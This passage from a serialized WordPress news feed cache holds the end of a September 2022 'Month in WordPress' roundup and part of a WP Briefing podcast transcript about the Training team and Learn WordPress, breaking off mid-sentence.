https://i0.wp.com/wordpress.org/news/files/2022/08/launch-featured.png?resize=300%2C175&amp;ssl=1 300w, https://i0.wp.com/wordpress.org/news/files/2022/08/launch-featured.png?resize=768%2C449&amp;ssl=1 768w, https://i0.wp.com/wordpress.org/news/files/2022/08/launch-featured.png?resize=1536%2C898&amp;ssl=1 1536w, https://i0.wp.com/wordpress.org/news/files/2022/08/launch-featured.png?w=2000&amp;ssl=1 2000w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<p>In addition, <a href=\"https://make.wordpress.org/meta/2022/09/01/simplifying-the-admin-bar-global-navigation-menu/\">the admin bar and global navigation menu have been updated</a> to simplify and better organize the content across the WordPress.org network. Expect more design updates and iterations as efforts to refresh the website continue.</p>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Check out the new <a href=\"https://wordpress.org/\">WordPress.org homepage</a> and <a href=\"https://wordpress.org/download/\">download page</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Gutenberg versions 13.9 and 14.0 are here</h2>\n\n\n\n<p>Two new versions of Gutenberg were released last month:</p>\n\n\n\n<ul>\n<li><a href=\"https://make.wordpress.org/core/2022/08/17/whats-new-in-gutenberg-13-9-17-august/\"><strong>Gutenberg 13.9</strong></a> became available for download on August 17, 2022. This release continues to iterate and polish the user interface (UI), interaction, and engine work for site editing.</li>\n\n\n\n<li><a href=\"https://make.wordpress.org/core/2022/09/01/whats-new-in-gutenberg-14-0-31-august/\"><strong>Gutenberg 14.0</strong></a> brings a lot of enhancements, including extra block supports in the UI, a revamped List block, and more. It shipped on August 31, 2022.</li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>This <a href=\"https://make.wordpress.org/core/2022/08/25/core-editor-improvement-refining-the-template-creation-experience/\">new post in the &#8220;Core Editor Improvement&#8221; series</a> focuses on the template creation enhancements coming in WordPress 6.1. You can explore them now with the <a href=\"https://wordpress.org/plugins/gutenberg/\">Gutengerg plugin</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>New localized content on Learn WordPress</h2>\n\n\n\n<p><a href=\"https://learn.wordpress.org/\">Learn WordPress</a> is currently expanding the non-English resources available on the platform! Last month, some members of the Training Team hosted <a href=\"https://wordpress.tv/2022/08/17/%e3%83%96%e3%83%ad%e3%83%83%e3%82%af%e3%82%a8%e3%83%87%e3%82%a3%e3%82%bf%e3%83%bc%e3%81%a7%e3%83%9b%e3%83%bc%e3%83%a0%e3%83%9a%e3%83%bc%e3%82%b8%e3%82%92%e4%bd%9c%e3%82%8d%e3%81%86%ef%bc%81/\">the first free online workshops in Japanese</a>. Following its success, two more sessions will be held on September 7 and 17, 2022. Get the details in the <a href=\"https://learn.wordpress.org/online-workshops/\">online workshop calendar</a>.</p>\n\n\n\n<p>In addition, learners have access to:</p>\n\n\n\n<ul>\n<li><a href=\"https://learn.wordpress.org/tutorials/?series=&amp;topic=&amp;language=pt_BR&amp;captions=&amp;wp_version=\">Portuguese tutorials</a></li>\n\n\n\n<li><a href=\"https://learn.wordpress.org/lesson-plans/greek/\">Greek lesson plans</a></li>\n</ul>\n\n\n\n<p>Curious about what else is new on Learn WordPress? <a href=\"https://make.wordpress.org/updates/2022/09/01/whats-new-on-learnwp-august-2022/\">Check out the learning materials released in August 2022</a>.</p>\n\n\n\n<blockquote class=\"wp-block-quote\">\n<p class=\"has-extra-large-font-size\">Enter the educational world of the Training Team and its Learn initiative in <a href=\"https://wordpress.org/news/2022/09/episode-38-all-about-learnwp-with-special-guest-hauwa-abashiya/\">the latest episode of WP Briefing</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Team updates: WordPress 6.0.2 maintenance release, Twenty Twenty-Three kickoff, and more</h2>\n\n\n\n<ul>\n<li><a href=\"https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/\">WordPress 6.0.2 is now available</a>. This security and maintenance release features 12 bug fixes on Core, 5 bug fixes for the Block Editor, and 3 security fixes.</li>\n\n\n\n<li>The new <a href=\"https://make.wordpress.org/design/2022/08/10/twenty-twenty-three-default-theme-project-kickoff/\">Twenty Twenty-Three (TT3) theme</a>, which will ship with the WordPress 6.1 release, is now in development. The theme will bundle a collection of style variations designed by community members. The final curated set is expected to be chosen by September 7, 2022.</li>\n\n\n\n<li>The <a href=\"https://make.wordpress.org/community/2022/08/19/meetup-organizer-newsletter-august-2022/\">August edition of the Meetup Organizer Newsletter</a> shares tips on how to join and support the <a href=\"https://make.wordpress.org/community/2022/07/08/call-for-supporters-reactivating-wordpress-meetups-around-the-world/\">Meetup Reactivation project</a>.</li>\n\n\n\n<li>The feedback tool for <a href=\"https://translate.wordpress.org/\">translate.wordpress.org</a> is now available for all WordPress.org users that have opted into notifications. Learn more in the latest edition of the <a href=\"https://make.wordpress.org/polyglots/2022/08/22/polyglots-monthly-newsletter-august-2022/\">Polyglots Monthly Newsletter</a>.</li>\n\n\n\n<li><a href=\"https://make.wordpress.org/meta/2022/09/05/improving-devhub-code-references/\">Code references in DevHub (WordPress Developer Docs)</a> are now easier to use, understand and navigate.</li>\n\n\n\n<li>Members of the Documentation Team kicked off discussions around the <a href=\"https://make.wordpress.org/docs/2022/08/10/kick-off-wordpress-6-1-release-docs/\">WordPress 6.1 release docs</a>.</li>\n\n\n\n<li>The <a href=\"https://make.wordpress.org/core/2022/08/09/bug-scrub-schedule-for-6-1/\">bug scrub schedule for WordPress 6.1</a> was published last month. Anyone can join these sessions to learn, help, or even <a href=\"https://make.wordpress.org/core/handbook/tutorials/leading-bug-scrubs/\">lead one</a>.</li>\n\n\n\n<li>To celebrate World Photography Day (August 19), the Photos Team <a href=\"https://make.wordpress.org/photos/2022/08/18/wordpress-world-photography-day-challenge-2022/\">set up a fun photo challenge</a> to contribute to the <a href=\"https://wordpress.org/photos/t/worldphotographyday22/\">WordPress Photo Directory</a>. The initiative may be over, but photo contributions are always open!</li>\n\n\n\n<li><a href=\"https://make.wordpress.org/performance/2022/08/09/core-performance-team-rep-nominations/\">Nominations</a> for the Performance Team Reps are open until September 9, 2022.</li>\n\n\n\n<li>Why is Gutenberg being developed on GitHub? Is Gutenberg part of core? <a href=\"https://make.wordpress.org/core/2022/08/18/wordpress-development-setup/\">Get answers</a> to these and other common questions about WordPress core and Gutenberg.</li>\n\n\n\n<li>Members of the Full Site Editing Outreach program <a href=\"https://make.wordpress.org/test/2022/08/25/hallway-hangout-discussion-on-block-themes-25-aug/\">joined a Hallway Hangout session to talk about block themes</a>, from workflow changes to tools they are using and more.</li>\n\n\n\n<li>The latest edition of People of WordPress features <a href=\"https://wordpress.org/news/2022/08/people-of-wordpress-bud-kraus/\">Bud Kraus</a> and his inspiring WordPress journey.</li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>The Testing Team is looking for <a href=\"https://make.wordpress.org/test/2022/08/10/testing-testing-calls-for-testing-facilitators/\">facilitators to expand testing efforts</a> across the project.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Feedback &amp; testing requests</h2>\n\n\n\n<ul>\n<li>Are you a meetup organizer or member? Complete the 2021-2022 <a href=\"https://make.wordpress.org/community/2022/08/02/announcing-the-2021-2022-annual-meetup-survey/\">Annual Meetup Survey</a> (available in 14 languages) to help strengthen this global WordPress program.</li>\n\n\n\n<li>Members of the Core Team are looking for feedback on a <a href=\"https://make.wordpress.org/core/2022/08/19/a-new-system-for-simply-and-reliably-updating-html-attributes/\">new system for updating HTML attributes</a>. The call is open until September 9, 2022.</li>\n\n\n\n<li>There’s a new proposal to <a href=\"https://make.wordpress.org/core/2022/08/10/proposal-stop-merging-experimental-apis-from-gutenberg-to-wordpress-core/\">harmonize the process of merging new APIs from the Gutenberg plugin</a> to the WordPress core. Share your thoughts by September 7, 2022.</li>\n\n\n\n<li>Version 20.6 of WordPress for <a href=\"https://make.wordpress.org/mobile/2022/08/23/call-for-testing-wordpress-for-android-20-6/\">Android</a> and <a href=\"https://make.wordpress.org/mobile/2022/08/22/call-for-testing-wordpress-for-ios-20-6/\">iOS</a> is available for testing.</li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Gutenberg 13.8 introduced the first version of fluid typography, a new feature that allows theme authors to define text size that can scale and adapt to changes in screen size. <a href=\"https://make.wordpress.org/themes/2022/08/15/testing-and-feedback-for-the-fluid-typography-feature/\">Help shape its future by joining this testing call</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Event updates &amp; WordCamps</h2>\n\n\n\n<ul>\n<li><a href=\"https://us.wordcamp.org/2022/wcus-what-you-need-to-know/\">Get ready for WordCamp US</a>! The event is happening on September 9 through 11, 2022, in San Diego, California. <a href=\"https://us.wordcamp.org/2022/schedule/\">Check out the schedule</a> and tune into the <a href=\"https://us.wordcamp.org/2022/livestream/\">WCUS livestream</a> if you are attending virtually.</li>\n\n\n\n<li>Openverse announced that they will be participating in the WordCamp US <a href=\"https://us.wordcamp.org/2022/contributor-day/\">Contributor Day</a> remotely. <a href=\"https://make.wordpress.org/openverse/2022/08/30/openverse-remote-contributor-day-at-wordcamp-us-2022/\">Learn how you can get involved</a>.</li>\n\n\n\n<li><a href=\"https://asia.wordcamp.org/2023/\">WordCamp Asia</a> organizers <a href=\"https://asia.wordcamp.org/2023/tickets-now-on-sale/\">sold out</a> the first batch of standard and micro sponsor tickets in one day. The second batch will be released soon.</li>\n\n\n\n<li>Planning for WordCamp Europe 2023 is in full swing! You can still <a href=\"https://europe.wordcamp.org/2023/call-for-organisers/\">apply to be an organizer</a>.</li>\n\n\n\n<li>Join #WPDiversity with a <a href=\"https://www.eventbrite.com/e/speaker-workshop-for-indian-women-in-the-wordpress-community-sept-24-25-tickets-348466712317\">free, online speaker workshop for Indian women</a> in the WordPress community. The event will take place on September 24-25, 2022.</li>\n\n\n\n<li>Don’t miss these other upcoming WordCamps:\n<ul>\n<li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1f3-1f1f1.png\" alt=\"🇳🇱\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://netherlands.wordcamp.org/2022/\">WordCamp Netherlands</a>, The Netherlands on September 15-16, 2022</li>\n\n\n\n<li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1ea-1f1f8.png\" alt=\"🇪🇸\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://pontevedra.wordcamp.org/2022/\">WordCamp Pontevedra</a>, Spain on September 24-25, 2022</li>\n</ul>\n</li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>The Call for Speakers for WordCamp Asia is closing soon! <a href=\"https://asia.wordcamp.org/2023/call-for-speakers/\">Submit your application by September 30, 2022</a>, and help reach <a href=\"https://asia.wordcamp.org/2023/speaker-diversity-goals/\">WCAsia&#8217;s speaker diversity goals</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<p><strong><em><strong><em><strong><em>Have a story that we should include in the next issue of The Month in WordPress? <strong><em>Fill out </em></strong><a href=\"https://make.wordpress.org/community/month-in-wordpress-submissions/\"><strong><em>this quick form</em></strong></a><strong><em> to let us know.</em></strong></em></strong></em></strong></em></strong></p>\n\n\n\n<p><em><em>The following folks contributed to this edition of The Month in WordPress: <a href=\'https://profiles.wordpress.org/laurlittle/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>laurlittle</a>, <a href=\'https://profiles.wordpress.org/mysweetcate/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>mysweetcate</a>, <a href=\'https://profiles.wordpress.org/chaion07/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>chaion07</a>, <a href=\'https://profiles.wordpress.org/bsanevans/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>bsanevans</a>, <a href=\'https://profiles.wordpress.org/priethor/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>priethor</a>, <a href=\'https://profiles.wordpress.org/rmartinezduque/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>rmartinezduque</a>, <a href=\'https://profiles.wordpress.org/webcommsat/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>webcommsat</a>.</em></em></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13445\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:13;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:76:\"WP Briefing: Episode 38: All About LearnWP with Special Guest Hauwa Abashiya\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:98:\"https://wordpress.org/news/2022/09/episode-38-all-about-learnwp-with-special-guest-hauwa-abashiya/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 05 Sep 2022 12:01:09 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13425\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:127:\"Enter the educational world of the WordPress Training team and its Learn initiative during this week\'s episode of the podcast. \";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/09/WP-Briefing-038.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:21067:\"\n<p>In the thirty-eighth episode of the WordPress Briefing, join Josepha Haden Chomphosy and special guest Hauwa Abashiya for a discussion on the WordPress Training team and LearnWP initiative. </p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2>Credits</h2>\n\n\n\n<p>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a><br>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/javiarce/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/javiarce/\">Javier Arce</a><br>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a> <br>Song: Fearless First by Kevin MacLeod </p>\n\n\n\n<h2>Guests</h2>\n\n\n\n<p><a href=\"https://profiles.wordpress.org/azhiyadev/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/azhiyadev/\">Hauwa Abashiya</a>&nbsp;</p>\n\n\n\n<h2>References</h2>\n\n\n\n<p><a href=\"https://heropress.com/essays/finding-my-global-family/\" data-type=\"URL\" data-id=\"https://heropress.com/essays/finding-my-global-family/\">Hauwa Abashiya HeroPress Essay</a><br><a href=\"https://make.wordpress.org/training\">make.wordpress.org/training</a><br><a href=\"http://make.wordpress.org\">make.wordpress.org</a><br><a href=\"https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/\" data-type=\"URL\" data-id=\"https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/\">WordPress 6.0.2 Security and Maintenance Release</a><br><a href=\"https://asia.wordcamp.org/2023/call-for-speakers/\" data-type=\"URL\" data-id=\"https://asia.wordcamp.org/2023/call-for-speakers/\">WordCamp Asia call for speakers </a>(deadline extended to September 30, 2022)<br><a href=\"https://us.wordcamp.org/2022/livestream/\" data-type=\"URL\" data-id=\"https://us.wordcamp.org/2022/livestream/\">WordCamp US Livestream information</a></p>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13425\"></span>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:00]&nbsp;</strong></p>\n\n\n\n<p>Hello, everyone! And welcome to the WordPress Briefing, the podcast where you can catch quick explanations of some of the ideas behind the WordPress open source project and the community around it, as well as get a small list of big things coming up in the next two weeks. I’m your host, Josepha Haden Chomphosy. Here we go!</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:42]&nbsp;</strong></p>\n\n\n\n<p>Helping people who are new to WordPress learn how to make the most out of their CMS used to be one of the most clearly impactful things I ever did as a contributor. Whether it was making sure a brand new installation simply worked, or if the original setup needed to grow along with a solopreneur&#8217;s growing business needs, I found great joy in seeing how my local community was learning new tools together.</p>\n\n\n\n<p>You&#8217;ve probably heard me talk about the Learn WP initiative or the training team on this podcast before, but you might still be a little shy to get started with the team. So I have invited one of their team reps today to talk through what the team does.</p>\n\n\n\n<p>All right. I have with us today Hauwa Abashiya. She is one of the team reps for the training team and also works on the learn.wordpress.org site. Thank you for joining me today, Hauwa.</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:01:33]&nbsp;</strong></p>\n\n\n\n<p>And thank you for having me, Josepha, quite exciting to be on your podcast.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:01:37]&nbsp;</strong></p>\n\n\n\n<p>Oh, I, you know, when we were talking about doing this topic, I was like, you know, who would be an excellent person is Hauwa. Like you were such an interesting person to work with when we were working on the <a href=\"https://wordpress.org/news/2020/12/simone/\">5.6 release</a>. And then also, you just have such a lovely way of explaining the complicated things that we have going on in WordPress and especially on the training side of things. And so you were the first person that came to mind for me.</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:02:02]</strong></p>\n\n\n\n<p>Thank you.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:02:03]</strong></p>\n\n\n\n<p>Speaking of all the learn.wordpress.org things, you&#8217;ve been contributing to the WordPress project as a team rep for the training team for a bit. But that&#8217;s not really where you started. Can you tell me a bit about how you found your way to this team?&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:02:15]</strong></p>\n\n\n\n<p>Well, I started by attending a WordCamp, and that was WordCamp Brighton. And if anyone&#8217;s read my <a href=\"https://heropress.com/essays/finding-my-global-family/\">article on HeroPress</a>, then they will know that I learned WordPress in one week. Went through beginner sessions of it. And then, I was like, yeah, let me just go turn up and see what it&#8217;s like.</p>\n\n\n\n<p>So turned up, and I met some wonderful people there. One of them being <a href=\"https://profiles.wordpress.org/miss_jwo/\">Jenny Wong</a>, who introduced me to the London meetup team. So, I then went there. They were looking for volunteers because they were planning WordCamp London for 2019. And me being me, I was like, yeah, sure. Why not? And got thrown into the deep end, but no, an amazing team.</p>\n\n\n\n<p>I got to meet some really amazing people. And yeah, just went from there then, you know, because I was doing stuff with WordCamp London, ended up going to WordCamp Europe. And I think there&#8217;s probably quite a lot of people who say they fully got into contributing in WordCamp Europe. So I was doing little bits and pieces then on like, marketing team and then met <a href=\"https://profiles.wordpress.org/jessecowens/\">Jesse [Owens]</a>  at the training team cause <a href=\"https://profiles.wordpress.org/webcommsat/\">Abha Thakor</a> introduced me to him and just went from there.</p>\n\n\n\n<p>And then in terms of team rep, I mean, <a href=\"https://wordpress.org/support/users/courane01/\">Courtney Robertson</a> sent out SOS, because Learn had just launched, and there were a couple of things that we needed. So that was during the soft launch. And I was like, yeah, sure. I&#8217;ll help you. I&#8217;m not doing much. And that&#8217;s how I ended up doing team rep.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:03:46]</strong></p>\n\n\n\n<p>I love that so many initial stories in the WordPress community start with like, well, I went to a WordCamp cause I was like, what in the world is this? And then people were like, we need some help. And I thought to myself, what else am I doing? Like, so many stories start that way. And I just love it.&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:04:03]</strong></p>\n\n\n\n<p>Yeah.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:04:03]</strong></p>\n\n\n\n<p>So you mentioned learn.wordpress.org. That is a part of the training team in the WordPress project. Correct?</p>\n\n\n\n<p>Yeah. So can you give us an idea of the difference between the two? Cause like normally, with a project as big as Learn, you would expect to see like a whole separate team. But these are two intertwined teams using two intertwined concepts.</p>\n\n\n\n<p>And so can you give us an idea of the difference between them?&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:04:29]</strong></p>\n\n\n\n<p>So I like to see learners, that&#8217;s the content. So it&#8217;s the content that we have on the platform, and the training team wrangles all the content on Learn. So that would be like your videos, your lesson plans, and online workshops. Yeah, so we wrangle the content that&#8217;s on there.</p>\n\n\n\n<p>We try to bring a lot of different teams together, and that&#8217;s one of the things the beauty, I think, of Learn is that there is a lot of cross-team collaboration, which started from the beginning and I think just will continue and get better and better.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:04:59]</strong></p>\n\n\n\n<p>Yeah. And the workshops, those are once a week, right?&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:05:04]</strong></p>\n\n\n\n<p>Yeah. So you have online workshops, which used to be called social learning spaces, which used to be called discussion groups. So those run once a week. There&#8217;s a number running, and there are some that are launching in Japan. And I think <a href=\"https://profiles.wordpress.org/bsanevans/\">Ben Evans</a> has been quite key in getting quite a lot of those going, and I think <a href=\"https://profiles.wordpress.org/piyopiyofox/\">Destiny Kanno</a> as well.</p>\n\n\n\n<p>So, that&#8217;s the beauty is you get to see a lot more languages coming up. Those run once a week. And then we obviously have lesson plans, which traditionally that&#8217;s what the training team used to always make for Meetup organizers. So if you didn&#8217;t have a speaker, you could go and get a lesson plan and run through something, or anybody could pick one up.</p>\n\n\n\n<p>So they are used mainly by like our Meetup users and then people who are running any boot camps or sessions, or you wanna just take somebody through WordPress and teach them, you can pick one up and run through it. And now we&#8217;ve got courses on Learn, which is quite exciting. Got a couple of courses.</p>\n\n\n\n<p>And I know there&#8217;s about three or four courses in development. There is a bit more WordPress development based rather than user based. There&#8217;s a fourth piece of content, and that is just the general workshop. So tutorials, I think no tutorials is what we&#8217;re calling them now. So there&#8217;s like all our online videos.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:06:17]</strong></p>\n\n\n\n<p>I tell you terminology in any project, the age and size of WordPress is hard to keep everything straight, but especially when you&#8217;ve just changed it you&#8217;re like, what do we call it though?&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:06:27]</strong></p>\n\n\n\n<p>Yeah.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:06:30]</strong></p>\n\n\n\n<p>So if I understand correctly, because as you mentioned, like you have this post up on HeroPress, you don&#8217;t actually come from a training background. Like you aren&#8217;t a teacher or corporate trainer or anything, but you have really committed to contributing to the training team and to learn.wordpress.org.</p>\n\n\n\n<p>So, from your perspective, from like the, I&#8217;m not a trainer perspective, what&#8217;s the most exciting thing for learn.wordpress.org in the near future?&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:06:58]</strong></p>\n\n\n\n<p>I think it&#8217;s the collaboration. It&#8217;s the potential that Learn has. So I don&#8217;t have a training background, but interestingly enough, I come from Kaduna, Nigeria. And Kaduna cause all the states in Nigeria have a tagline, and, Kaduna is actually the center of learning. So there must be some link there, so yeah.</p>\n\n\n\n<p>So, I think the beauty of that is you don&#8217;t have to have a training background. You can come in and impart your knowledge, and there are people available in the team that can help you impart that knowledge. So if it&#8217;s like a lesson plan that you wanna draw up, we&#8217;ve got people that can help and assist in that.</p>\n\n\n\n<p>Or you wanna run an online workshop. There are people that can assist you. And I think that&#8217;s also the beauty of WordPress is that we&#8217;re all there to help each other. So just seeing that and seeing how, as time has gone on how the team has actually just been growing cause more and more people are coming.</p>\n\n\n\n<p>And then with that, you&#8217;ve got more of like the different languages coming in, and I know we might touch on that later, but it&#8217;s, I think to me, that is the beauty that anyone can actually now come in and learn. And Learn as this platform that is accessible to everybody. So it&#8217;s not necessarily behind a, like a paywall or anything, which is, there&#8217;s nothing wrong with that, but there are people that it&#8217;s like, well, okay, you can access something by the community for the community.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:08:32]</strong></p>\n\n\n\n<p>I think like your last thought there, something that&#8217;s by the community for the community. That&#8217;s one of the things that I noticed early on about the WordPress community. So I&#8217;ve been in the WordPress community for a long time, but when I started doing the administrative back office, things that are invisible and no one wants to know about, because it&#8217;s boring.</p>\n\n\n\n<p>When I started doing that work, one of the things I noticed and that I really treasure the most about the WordPress community is that they want to do things together. They want to look at the problem together. They want to find a solution together. And a lot of times they just want to learn together as well.</p>\n\n\n\n<p>We see that there is a real, I don&#8217;t know, not, it&#8217;s not a safety and numbers question. I think it is a long-standing feeling that we can all kind of get further together and that we are better together. And so I like your thought there.</p>\n\n\n\n<p>You mentioned, though, translations, and I know that this came up at WordCamp Europe.</p>\n\n\n\n<p>We don&#8217;t actually have a lot of translated content on learn.wordpress.org. There&#8217;s some technical issues that exist there, but are there a few languages that we already are sort of seeing translated courses for? Translated lessons for?&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:09:47]</strong></p>\n\n\n\n<p>Yeah. So we have a couple in Hindi, I believe. And I know we&#8217;ve got some Greek translations that have been coming up, so I know, I think it was last year WordCamp India, during contributor day, we had quite a lot of people translating stuff then, and I suppose the online WordCamps that we&#8217;ve been able to rank. Cause I think our first like face to face is this year, so they didn&#8217;t do that much translation there, but we&#8217;ve seen an increase in people wanting to translate.&nbsp;</p>\n\n\n\n<p>And I think those are the ones that come to mind. And I know Japanese, I think that was just recently, in the last two weeks, somebody&#8217;s translated one or two of the tutorials have been translated.</p>\n\n\n\n<p>But we’re getting more and more requests coming through. And I know we kind of touched on this in our earlier discussion, but it&#8217;s like, how do you manage that? Cause you&#8217;re right, we don&#8217;t have a way to easily manage polyglots on Learn at the moment or WordPress in general. But I think seeing that, and I keep saying to people, I don&#8217;t wanna lose that engagement cause if you&#8217;ve got the people engaged, let them just do it.</p>\n\n\n\n<p>And I don&#8217;t normally say this, but let them do it, and we&#8217;ll figure out how to sort out the whole pile when it comes in later. Because you kind of don&#8217;t want to lose them because I feel like if we say, no, we&#8217;ll wait until that comes in, we&#8217;ll lose a lot of the engagement. And come that time, people will be like, oh no, I&#8217;m not that interested. Or it might be an even more effort to try and bring more people on board.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:11:18]</strong></p>\n\n\n\n<p>That&#8217;s always a struggle, like wanting to be able to get something good out without insisting that it be perfect. Like that whole perfect is the enemy of the good sort of concept.&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:11:30]</strong></p>\n\n\n\n<p>Yeah. Mm-hmm&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:11:30]</strong></p>\n\n\n\n<p>When we were talking about this way back in June, I was like, I obviously would love to get a perfect solution out immediately, but like, you&#8217;re right.</p>\n\n\n\n<p>In the meantime, do we just be if you 